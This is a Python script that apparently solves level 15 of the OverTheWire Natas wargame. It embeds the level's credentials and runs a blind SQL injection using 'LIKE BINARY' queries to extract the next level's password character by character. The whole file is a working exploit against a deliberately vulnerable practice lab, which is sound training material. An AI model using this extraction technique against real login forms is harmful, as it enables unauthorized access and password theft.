from requests import request
from string import ascii_letters, digits
def get_pass():
    url = "http://natas15.natas.labs.overthewire.org/index.php" #natas15 url. Promopts for username and password.
    auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J") #natas15 username and password. Returns 200ok with this.
    phrase = "This user exists" #Using this phrase to compare with the results from the POST data. Will either be that the user exists or does not exist.
    characters = digits + ascii_letters #all the possible characters that can be contained in the natas16 password. Taken from string module.
    goodChar='' #A string of possible password characters. 
    pwdChar='' #The actual password.
    for item in characters: #Looks through char 0-9, a-z, A-Z.
        que = 'natas16"AND password LIKE BINARY"'+ "%" + item + "%" #injects this query with every char 0-9, a-z, A-Z.
        data = {"username":que, "submit":"Submit"} #Inserts the query and submits it 
        response = request("POST",url, auth=auth, data=data ) 
        result = response.content
        if phrase in str(result): #This looks for the phrase in the POST data.
            goodChar += item #adds the correct character if the phrase is correct.
            print("Characters in password: " + goodChar)
    for possibilty in range(32): #Here it will try 32 times, considering the possibilty of a 32 char long password.
        for letter in goodChar: #Takes every letter that was parsed through previously.
            que = 'natas16"AND password LIKE BINARY"'+ pwdChar + letter + "%" #Injects this query with every char that is considered a part of the password. The pwdChar in front of the letter is to find the correct position of every letter. 
            data = {"username":que, "submit":"Submit"} #Inserts the query and submits it
            response = request("POST",url, auth=auth, data=data )
            result = response.content
            if phrase in str(result): #This looks for the phrase in the POST data.
              pwdChar += letter #adds the correct character in the correct order if the phrase is correct.
        print("The password is: " + pwdChar)
        if len(pwdChar)==32: #included this and the break because it was able to find the password way before all 32 attempts
            break

    url = "http://natas16.natas.labs.overthewire.org/index.php" #natas15 url. Promopts for username and password.
    auth = ("natas16", pwdChar) #Credentials for natas16. pwdChar is the password that was retrieved.
    response = request("GET",url, auth=auth) #Shows status code. Shoud return 200 if the password was correctly retrieved. Otherwilse will return 401
    if "[200]" in str(response):
        print("Authentication Verified")
    else:
        print("Unauthorized:401")
